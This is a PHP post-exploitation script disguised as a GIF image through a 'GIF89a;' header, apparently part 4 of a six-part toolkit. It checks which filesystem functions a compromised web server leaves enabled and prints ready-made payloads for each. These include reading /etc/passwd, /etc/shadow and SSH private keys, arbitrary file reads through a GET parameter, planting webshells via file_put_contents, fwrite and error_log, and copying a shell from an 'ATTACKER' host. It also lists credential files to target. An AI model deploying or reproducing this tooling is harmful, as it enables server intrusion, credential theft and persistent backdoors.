GIF89a;
<?php
error_reporting(0);
$d = array_map('trim', explode(',', ini_get('disable_functions')));
function ok($f){ global $d; return function_exists($f) && !in_array($f,$d); }
$o = '';

$o .= "============================================================\n";
$o .= "  PART 4/6 - Filesystem Read + Write\n";
$o .= "============================================================\n\n";

$o .= "====== 6. Filesystem - READ [HIGH] ======\n";
$o .= "Read files, list directories, leak source code and configs\n\n";

$o .= "--- FILE READING ---\n\n";
$reads = array(
    'file_get_contents' => array(
        "echo file_get_contents('/etc/passwd');",
        "echo base64_encode(file_get_contents(\$_GET['f']));  // ?f=/etc/passwd",
        'Reads entire file to string - most versatile'
    ),
    'file' => array(
        "print_r(file('/etc/passwd'));",
        "\$l=file(\$_GET['f']); foreach(\$l as \$x) echo \$x;",
        'Returns array of lines'
    ),
    'readfile' => array(
        "readfile('/etc/passwd');",
        "readfile(\$_GET['f']);",
        'Outputs file directly to browser - low memory usage'
    ),
    'fopen' => array(
        "\$h=fopen('/etc/passwd','r'); echo fread(\$h,filesize('/etc/passwd')); fclose(\$h);",
        "\$h=fopen(\$_GET['f'],'r'); while(\$l=fgets(\$h)) echo \$l; fclose(\$h);",
        'Open file handle - works with fread/fgets/fgetc'
    ),
    'highlight_file' => array(
        "highlight_file('/var/www/html/config.php');",
        "highlight_file(\$_GET['f']);",
        'Shows PHP source with SYNTAX HIGHLIGHTING - reveals all code!'
    ),
    'show_source' => array(
        "show_source('../config.php');",
        "",
        'Alias of highlight_file'
    ),
    'php_strip_whitespace' => array(
        "echo php_strip_whitespace('config.php');",
        "",
        'Shows code without comments/whitespace - compact view'
    ),
    'parse_ini_file' => array(
        "print_r(parse_ini_file('/etc/php/7.0/apache2/php.ini'));",
        "",
        'Parses .ini files into array - reads PHP config!'
    ),
);
foreach ($reads as $f => $info) {
    $s = ok($f) ? "[+] AVAILABLE" : "[-] blocked";
    $o .= "  $s  $f\n";
    $o .= "           {$info[2]}\n";
    if (ok($f)) {
        $o .= "           Quick: {$info[0]}\n";
        if ($info[1]) $o .= "           Shell: {$info[1]}\n";
    }
    $o .= "\n";
}

// Additional read helpers
$o .= "--- HELPER READ FUNCTIONS ---\n\n";
$helpers = array(
    'fread'=>'Read bytes from handle','fgets'=>'Read line from handle',
    'fgetc'=>'Read char from handle','fgetcsv'=>'Read CSV line',
    'readlink'=>'Read symlink target (readlink(\"/proc/self/cwd\"))',
    'realpath'=>'Resolve relative path (bypass ../.. filters)',
    'gzfile'=>'Read gzip compressed files',
    'readgzfile'=>'Output gzip file directly',
    'exif_read_data'=>'Read EXIF from images (may contain injected code)',
    'getimagesize'=>'Image info - can leak paths in errors',
    'get_meta_tags'=>'Read HTML meta tags from file/URL',
    'hash_file'=>'Hash file - confirms file is readable',
    'md5_file'=>'MD5 of file content',
);
foreach ($helpers as $f => $desc) {
    $s = ok($f) ? "[+]" : "[-]";
    $o .= "  $s  $f - $desc\n";
}

$o .= "\n--- DIRECTORY LISTING ---\n\n";
$dirs = array(
    'scandir' => array(
        "print_r(scandir('/home'));",
        "print_r(scandir(\$_GET['d']));  // ?d=/home",
        'List all files in directory'
    ),
    'glob' => array(
        "print_r(glob('/home/*/flag*'));",
        "print_r(glob(\$_GET['g']));  // ?g=/home/*/*",
        'Pattern search like find command! Wildcards: * ? [abc]'
    ),
    'opendir' => array(
        "\$d=opendir('.'); while((\$f=readdir(\$d))!==false) echo \$f.\"\\n\"; closedir(\$d);",
        "",
        'Open directory handle for iteration'
    ),
);
foreach ($dirs as $f => $info) {
    $s = ok($f) ? "[+] AVAILABLE" : "[-] blocked";
    $o .= "  $s  $f\n";
    $o .= "           {$info[2]}\n";
    if (ok($f)) {
        $o .= "           Quick: {$info[0]}\n";
        if ($info[1]) $o .= "           Shell: {$info[1]}\n";
    }
    $o .= "\n";
}

$o .= "--- FILE EXISTENCE / PERMISSION CHECKS ---\n\n";
$checks = array(
    'file_exists'=>'Check if file exists (path oracle for blind enum)',
    'is_readable'=>'Check read permission on file/dir',
    'is_writable'=>'Check write permission (find writable dirs!)',
    'is_executable'=>'Check if file is executable',
    'is_dir'=>'Check if path is directory',
    'is_file'=>'Check if path is regular file',
    'is_link'=>'Check if path is symlink',
    'stat'=>'Full file info (size, owner, perms, timestamps)',
    'lstat'=>'Same but for symlinks',
    'fileperms'=>'Get file permissions',
    'fileowner'=>'Get file owner UID',
    'filesize'=>'Get file size',
);
foreach ($checks as $f => $desc) {
    $s = ok($f) ? "[+]" : "[-]";
    $o .= "  $s  $f - $desc\n";
}

$o .= "\n--- IMPORTANT FILES TO READ ---\n";
$o .= "/etc/passwd | /etc/shadow | /etc/hosts | /etc/hostname\n";
$o .= "/etc/crontab | /proc/self/environ | /proc/version | /proc/self/cmdline\n";
$o .= "/var/www/html/config.php | /var/www/html/.env | /var/www/html/wp-config.php\n";
$o .= "/home/*/.bash_history | /home/*/.ssh/id_rsa | /root/.bash_history\n";
$o .= "/var/log/apache2/access.log | /var/log/apache2/error.log\n";
$o .= "/var/log/auth.log | /var/log/mail.log | /var/log/syslog\n";

// ============================================================
$o .= "\n\n====== 7. Filesystem - WRITE [HIGH] ======\n";
$o .= "Write webshells, overwrite configs, create symlinks\n\n";

$o .= "--- FILE WRITING ---\n\n";
$writes = array(
    'file_put_contents' => array(
        "file_put_contents('shell.php','<?php system(\$_GET[c]);?>');",
        "file_put_contents(\$_GET['p'],\$_GET['d']);  // ?p=shell.php&d=<?php...",
        'Write string to file - EASIEST shell upload'
    ),
    'fwrite' => array(
        "\$h=fopen('shell.php','w'); fwrite(\$h,'<?php system(\$_GET[c]);?>'); fclose(\$h);",
        "",
        'Write to file handle'
    ),
    'error_log' => array(
        "error_log('<?php system(\$_GET[c]);?>',3,'../shell.php');",
        "error_log(\$_GET['d'],3,\$_GET['p']);",
        'WRITE TO ANY FILE via mode 3! Often overlooked!'
    ),
    'copy' => array(
        "copy('http://ATTACKER/shell.php','/var/www/html/s.php');",
        "copy(\$_GET['src'],\$_GET['dst']);",
        'Copy file - works with URLs if allow_url_fopen=On!'
    ),
    'rename' => array(
        "rename('shell.php.png','shell.php');",
        "",
        'Rename file - change extension to bypass upload filter!'
    ),
    'symlink' => array(
        "symlink('/etc/passwd','./passwd.txt');",
        "symlink('/root/.ssh/id_rsa','./key.txt');",
        'Create symbolic link to protected files!'
    ),
    'link' => array(
        "link('/etc/passwd','./p.txt');",
        "",
        'Create hard link'
    ),
);
foreach ($writes as $f => $info) {
    $s = ok($f) ? "[+] AVAILABLE" : "[-] blocked";
    $o .= "  $s  $f\n";
    $o .= "           {$info[2]}\n";
    if (ok($f)) {
        $o .= "           Quick: {$info[0]}\n";
        if ($info[1]) $o .= "           Shell: {$info[1]}\n";
    }
    $o .= "\n";
}

$o .= "--- FILE MANAGEMENT ---\n\n";
$mgmt = array(
    'mkdir'=>'Create directory','rmdir'=>'Remove directory',
    'unlink'=>'Delete file (unlink(\".htaccess\"))',
    'chmod'=>'Change permissions (chmod(\"shell.php\",0777))',
    'chown'=>'Change file owner','chgrp'=>'Change file group',
    'touch'=>'Create empty file / change timestamps',
    'tempnam'=>'Create temp file with prefix',
    'move_uploaded_file'=>'Move uploaded temp file',
    'fputs'=>'Alias of fwrite',
);
foreach ($mgmt as $f => $desc) {
    $s = ok($f) ? "[+]" : "[-]";
    $o .= "  $s  $f - $desc\n";
}

$o .= "\n--- IMAGE FUNCTIONS (hidden file write!) ---\n\n";
$imgs = array('imagepng','imagejpeg','imagegif','imagexbm','imagewbmp','imagegd','imagegd2');
foreach ($imgs as $f) {
    $s = ok($f) ? "[+]" : "[-]";
    $o .= "  $s  $f - 2nd parameter is FILE PATH = writes to disk!\n";
}

file_put_contents('/tmp/_audit_p4.txt', $o);
header('Content-Type: text/plain; charset=utf-8');
echo $o;
echo "\n[*] Part 4/6 saved to /tmp/_audit_p4.txt\n";
?>
